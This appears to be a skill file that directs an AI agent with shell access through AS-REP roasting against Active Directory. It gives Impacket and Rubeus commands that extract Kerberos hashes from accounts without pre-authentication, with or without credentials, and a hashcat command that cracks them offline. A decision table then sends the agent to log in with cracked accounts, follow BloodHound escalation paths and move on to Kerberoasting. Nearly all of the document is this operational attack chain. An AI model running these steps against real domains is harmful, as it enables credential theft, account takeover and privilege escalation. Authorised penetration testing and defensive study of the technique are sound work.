---
name: asrep-roasting
description: "AS-REP hash extraction for accounts without Kerberos pre-authentication"
allowed-tools: Bash
metadata:
  subdomain: active-directory
  mitre_attack: T1558.004
  when_to_use: "asrep, as-rep, preauth, dontreqpreauth, GetNPUsers"
  tags: active-directory, kerberos, credential-access
---

# AS-REP Roasting — Pre-Auth Disabled Hash Extraction

Targets accounts with `DONT_REQUIRE_PREAUTH` set. The KDC returns an AS-REP encrypted with the user's password hash — no valid credentials required, only a username list.

## 1. Enumerate & Extract

**Impacket (Linux)**
```bash
# No creds — spray a user list
impacket-GetNPUsers '<DOMAIN>/' -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -no-pass

# With valid creds — auto-enumerate vulnerable accounts
impacket-GetNPUsers '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request -format hashcat -outputfile asrep_hashes.txt
```

**Rubeus (Windows)**
```powershell
# All vulnerable accounts
Rubeus.exe asreproast /format:hashcat /outfile:C:\workspace\asrep_hashes.txt

# Target specific user
Rubeus.exe asreproast /user:<TARGET_USER> /format:hashcat /outfile:C:\workspace\asrep_target.txt
```

## 2. Ingest into KnowledgeGraph

```python
# Parse and ingest AS-REP hashes as credential leads
kg_ingest_asrep_hashes("/workspace/asrep_hashes.txt")
```

## 3. Crack Offline

```bash
# Kerberos 5 AS-REP etype 23 — mode 18200
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o asrep_cracked.txt
```

## 4. Classify Hash

```python
# Confirm hash type and hashcat mode
kerberos_classify("$krb5asrep$23$user@DOMAIN:...")
```

## 5. Decision Gates

| Condition | Action |
|-----------|--------|
| No creds available | Spray with user list via GetNPUsers — no auth needed |
| Valid creds available | Use `-request` to auto-enumerate + extract |
| Hash cracked | Authenticate and check BloodHound paths for escalation |
| No hashes returned | No accounts have pre-auth disabled — move to Kerberoasting |

## Anti-Patterns
- Not trying without credentials first — AS-REP roasting works with zero creds if you have a user list.
- Ignoring cracked accounts without checking their AD group memberships — always cross-reference with BloodHound.
- Using john instead of hashcat for AS-REP — hashcat mode 18200 is significantly faster on GPU.
